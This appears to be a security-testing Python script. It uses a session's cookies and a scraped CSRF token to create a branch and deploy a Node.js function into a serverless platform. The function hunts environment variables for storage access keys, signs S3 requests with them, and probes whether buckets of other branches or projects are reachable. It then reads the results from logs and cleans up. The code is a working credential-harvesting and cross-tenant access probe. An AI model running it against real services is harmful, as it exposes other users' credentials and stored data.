# -*- coding: utf-8 -*-
"""攻击测试:函数注入的 storage 凭据 scope 边界
假设:nak_live/nsk_live 是 storage 服务签发的宽 scope 凭据,若 ListBuckets 可见
同 cell 其他项目 bucket 或 HeadBucket 可跨 project 访问 = 数据泄露洞。
流程:
1. 控制面:建新 branch(拿第二个 bid) — 测 scope 是否 >= project 级
2. 部署探测函数(自动发现 env 凭据)
3. 函数内:ListBuckets(全览) -> 对自己 bucket ListObjects(基线) ->
   HeadBucket 候选(同 project 新 branch 的 br-<bid>, <bid>)
4. 轮询 logs 收结果
5. 清理:删函数 + 删新 branch
"""
import http.client, ssl, json, re, html, os, sys, time, io, zipfile, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def ctl_req(method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

# 1. 建新 branch(第二个 branch id)
st, raw = ctl_req('POST', API_BASE + '/projects/%s/branches' % PID,
                  {'branch': {'name': 'sec-cross-br-' + uuid.uuid4().hex[:6]}})
print('create branch -> %d %s' % (st, raw[:400]), flush=True)
new_bid = None
try:
    new_bid = json.loads(raw).get('branch', {}).get('id')
except Exception:
    pass
print('new_bid = %s' % new_bid, flush=True)

# 2. 部署探测函数
PROBE = r'''import crypto from 'node:crypto';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
function log(k, v) {
  const s = JSON.stringify(v);
  for (let i = 0; i < s.length; i += 800) { console.log('P1 ' + k + ' ' + s.slice(i, i + 800)); }
}
function hmac(k, s) { return crypto.createHmac('sha256', k).update(s).digest(); }
function sha256(s) { return crypto.createHash('sha256').update(s).digest('hex'); }
async function s3req(method, host, path, region, ak, sk, bucket) {
  // path: '/' 或 '/bucket' 的 URL 编码(简单名不需编码)
  const amz = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const ds = amz.slice(0, 8);
  const payload = sha256('');
  const canon = method + '\n' + path + '\n\nhost:' + host + '\nx-amz-content-sha256:' + payload +
    '\nx-amz-date:' + amz + '\n\nhost;x-amz-content-sha256;x-amz-date\n' + payload;
  const scope = ds + '/' + region + '/s3/aws4_request';
  const sts = 'AWS4-HMAC-SHA256\n' + amz + '\n' + scope + '\n' + sha256(canon);
  const kd = hmac(hmac(hmac(hmac('AWS4' + sk, ds), region), 's3'), 'aws4_request');
  const sig = crypto.createHmac('sha256', kd).update(sts).digest('hex');
  const auth = 'AWS4-HMAC-SHA256 Credential=' + ak + '/' + scope +
    ', SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=' + sig;
  try {
    const r = await fetch('https://' + host + path, {
      method, headers: { 'Host': host, 'X-Amz-Date': amz,
        'X-Amz-Content-Sha256': payload, 'Authorization': auth },
      signal: AbortSignal.timeout(12000) });
    const tx = await r.text();
    return r.status + ' ' + tx.slice(0, 2500).replace(/\s+/g, ' ');
  } catch (e) { return 'ERR ' + (e && e.message ? e.message : e); }
}
async function probe() {
  await sleep(800);
  const e = process.env;
  // 自动发现 S3 凭据/endpoint(值特征匹配,不依赖键名)
  let ak = '', sk = '', ep = '';
  for (const [k, v] of Object.entries(e)) {
    if (!v) continue;
    if (v.startsWith('nak_live')) { ak = v; log('AK_KEY', k); }
    if (v.startsWith('nsk_live')) { sk = v; log('SK_KEY', k); }
    if (/^https?:\/\//.test(v) && /s3|storage|minio/i.test(v)) { ep = v; log('EP_KEY', k + '=' + v); }
  }
  log('DISC', { ak: !!ak, sk: !!sk, ep: ep || '' });
  if (!ak || !sk || !ep) { console.log('P1 no creds found'); return; }
  let host, region = 'us-east-2';
  try { host = new URL(ep).host; } catch (e) { console.log('P1 ep parse ERR ' + e.message); return; }
  // 1) ListBuckets — 全览可见 bucket
  console.log('P1 LB ' + await s3req('GET', host, '/', region, ak, sk));
  // 2) 对自己 bucket ListObjects 基线(bucket 名从 ListBuckets 推断不了就用尝试集合)
  //    由外部控制面传入候选:br-<bid> 与 <bid>
  const cands = globalThis.__CANDS || [];
  for (const b of cands) {
    console.log('P1 OB ' + b + ' ' + await s3req('GET', host, '/' + b, region, ak, sk));
  }
  console.log('P1 done');
}
probe();
export default { fetch: async (req) => new Response('ok') };
'''
# 候选 bucket 注入:主 branch + 新 branch(bucket 名两种格式)
cands = ['br-' + BID, BID]
if new_bid:
    cands += ['br-' + new_bid, new_bid]
PROBE = PROBE.replace('globalThis.__CANDS || []', json.dumps(cands))

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', PROBE)
    z.writestr('package.json', '{"name":"p1","type":"module","main":"index.js"}')
buf.seek(0)
zip_bytes = buf.read()

SLUG = 'secp1' + uuid.uuid4().hex[:6]
FP = '/projects/%s/branches/%s/functions' % (PID, BID)
boundary = '----b' + uuid.uuid4().hex
body = (('--' + boundary + '\r\nContent-Disposition: form-data; name="zip"; filename="b.zip"\r\nContent-Type: application/zip\r\n\r\n').encode()
        + zip_bytes + b'\r\n'
        + ('--' + boundary + '\r\nContent-Disposition: form-data; name="runtime"\r\n\r\nnodejs24\r\n').encode()
        + ('--' + boundary + '--\r\n').encode())
st, raw = ctl_req('POST', API_BASE + FP + '/' + SLUG + '/deployments', None,
                  ctype='multipart/form-data; boundary=' + boundary, raw_body=body)
print('deploy -> %d %s' % (st, raw[:250]), flush=True)

# 3. 轮询 logs
seen = set()
for i in range(20):
    time.sleep(5)
    st2, raw2 = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID),
                        {'since': '5m', 'body_contains': 'P1 '})
    try:
        for lg in json.loads(raw2).get('logs', []):
            msg = lg.get('message') or lg.get('line') or str(lg)
            if isinstance(msg, str) and msg.startswith('P1 ') and msg not in seen:
                seen.add(msg)
                print('LOG: %s' % msg[:1300], flush=True)
    except Exception:
        pass
    if 'P1 done' in ' '.join(seen):
        break
print('rows:', len(seen), flush=True)

# 4. 清理
st, raw = ctl_req('DELETE', API_BASE + FP + '/' + SLUG)
print('cleanup fn -> %d' % st, flush=True)
if new_bid:
    st, raw = ctl_req('DELETE', API_BASE + '/projects/%s/branches/%s' % (PID, new_bid))
    print('cleanup branch -> %d %s' % (st, raw[:200]), flush=True)
